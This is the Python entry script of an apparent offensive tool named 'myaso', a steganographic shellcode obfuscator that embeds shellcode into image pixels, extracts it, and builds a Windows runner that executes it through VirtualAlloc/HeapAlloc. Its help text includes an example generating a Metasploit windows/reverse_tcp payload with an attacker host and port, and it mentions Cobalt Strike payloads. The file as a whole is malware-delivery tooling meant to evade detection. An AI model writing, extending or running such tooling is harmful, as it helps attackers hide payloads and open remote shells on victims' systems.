"""
C implementation reads pixels left to right, top to bottom
Python implementation reads pixels left to right, bottom to top!
"""
import argparse
import os

from PIL import Image
from bitarray import bitarray

from src import shellcode, builder
from algorithms import LSB, LSBX

ALGORITHMS = {
    'LSB': LSB,
    'LSB-X': LSBX
}


def embed_sc(args):
    sc = shellcode.from_args(args)
    print(f'Got shellcode: {sc}')
    payload = bitarray()
    payload.frombytes(sc)
    algorithm = ALGORITHMS[args.algorithm]

    img = Image.open(args.src)
    algorithm.embed(img, payload)
    img.save(args.dst)


def read_sc(args):
    img = Image.open(args.src)
    algorithm = ALGORITHMS[args.algorithm]
    payload = algorithm.extract(img, args.max_bits)
    print(payload.tobytes())


def get_runner(args):
    builder.get_runner(args.runner_config)


command_handlers = {
    'embed': embed_sc,
    'read': read_sc,
    'get-runner': get_runner
}

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        prog='myaso',
        description='A steganographic shellcode obfuscator. '
                    'The executor reads data from an image and executes it '
                    'using VirtualAlloc/HeapAlloc. '
    )

    parser.add_argument('command', metavar='<command>', help=f'One of {command_handlers.keys()}')

    # embed
    parser.add_argument('-s', '--sc', '--shellcode', dest='sc_file',
                        help='Shellcode file or msf:// payload (-p option)\n'
                             'pass the options in the extra_options arg:\n'
                             'python main.py --sc msf://windows/reverse_tcp -i ... -o ... -- LHOST=1.1.1.1 LPORT=4444'
                        )

    parser.add_argument('-i', dest='src', help='Source image')
    parser.add_argument('-o', dest='dst', help='Destination image')

    # read
    parser.add_argument('--max-bits', type=int, help='Shellcode length')
    parser.add_argument('-a', dest='algorithm',
                        help=f'Algorithm to use. Available options: {", ".join(ALGORITHMS.keys())}')

    # generate
    parser.add_argument('-r', '--runner-config', dest='runner_config', help='Runner config')
    parser.add_argument('extra_options', nargs='*',
                        help='Options used when generating a Cobalt or MSF payload')

    args = parser.parse_args()

    command_handlers[args.command](args)
